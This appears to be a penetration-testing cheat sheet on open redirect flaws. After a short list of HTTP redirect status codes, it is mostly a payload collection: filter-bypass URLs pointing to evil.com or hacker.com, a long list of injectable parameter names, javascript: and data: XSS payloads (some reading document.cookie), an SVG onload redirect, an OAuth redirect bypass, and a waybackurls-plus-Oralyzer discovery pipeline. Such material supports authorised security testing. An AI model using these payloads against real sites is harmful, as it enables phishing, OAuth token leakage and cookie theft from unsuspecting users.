# Open Redirect
Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.

## Using the open url redirect
Below are the most common things I will try with an open url redirect:

* Leak tokens via mis-configured apps/login flows
* Bypassing blacklists for SSRF/RCE
* XSS via javascript:alert(0)


## HTTP Redirection Status Code
HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:

* [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
* [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
* [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
* [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
* [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
* [305 Use Proxy](https://httpstatuses.com/305) - The requested resource must be accessed through a proxy provided in the Location header.
* [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
* [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.

## Filter Bypass
Using a whitelisted domain or keyword
```html
www.whitelisted.com.evil.com redirect to evil.com

```
Using CRLF to bypass "javascript" blacklisted keyword
```html
java%0d%0ascript%0d%0a:alert(0)

```
Using "//" & "////" to bypass "http" blacklisted keyword
```html
//google.com
////google.com

```
Using "https:" to bypass "//" blacklisted keyword
```html
https:google.com

```
Using "//" to bypass "//" blacklisted keyword (Browsers see // as //)
```html
\/\/google.com/
/\/google.com/

```
Using "%E3%80%82" to bypass "." blacklisted character
```html
/?redir=google。com

//google%E3%80%82com

https://target.com/auth/sso/init/user@target.com?callback=https://google.com%E3%80%82target.com
```
Using null byte "%00" to bypass blacklist filter
```html
//google%00.com

```
Using parameter pollution
```html
?next=whitelisted.com&next=google.com

```
Using "@" character, browser will redirect to anything after the "@"
```html
http://www.theirsite.com@yoursite.com/

```
Creating folder as their domain
```html
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com

```
Using "?" characted, browser will translate it to "/?"
```html
http://www.yoursite.com?http://www.theirsite.com/
http://www.yoursite.com?folder/www.folder.com

```
Host/Split Unicode Normalization
```html
https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
http://a.com／X.b.com

```
XSS from Open URL - If it's in a JS variable
```html
";alert(0);//

```
XSS from data:// wrapper
```html
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==

```
XSS from javascript:// wrapper
```html
http://www.example.com/redirect.php?url=javascript:prompt(1)

```
## Common injection parameters
```html
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```
**Open Redirect to XSS**
```javascript
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//

```
**Open Redirect uploading svg files**
```html
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```

**Bypassing Open Redirect in OAuth**
```bash
Failed Attempt:
https://example.com@hacker.com

Successful Attempt:
https://hacker.com\@example.com

Tip: Fuzz special ASCII characters at the edges of URLs to bypass restrictions.
```
![open](https://github.com/user-attachments/assets/d725af7f-d136-4b5b-a456-0b0d7e55456c)



## Automate discovery
```bash
# recommend method
waybackurls target.com | grep =http | qsreplace -a  | while read domain; do python3 oralyzer.py -u $domain; done

# alternative method
waybackurls target.com | gf redirect | qsreplace -a  | while read domain; do python3 oralyzer.py -u $domain; done

```

## Tools
* Burp Suite Intruder / Repeater / Logger++ (Use this extension in Burp Suite for detect pattern)
* [Oralyzer](https://github.com/r0075h3ll/Oralyzer)





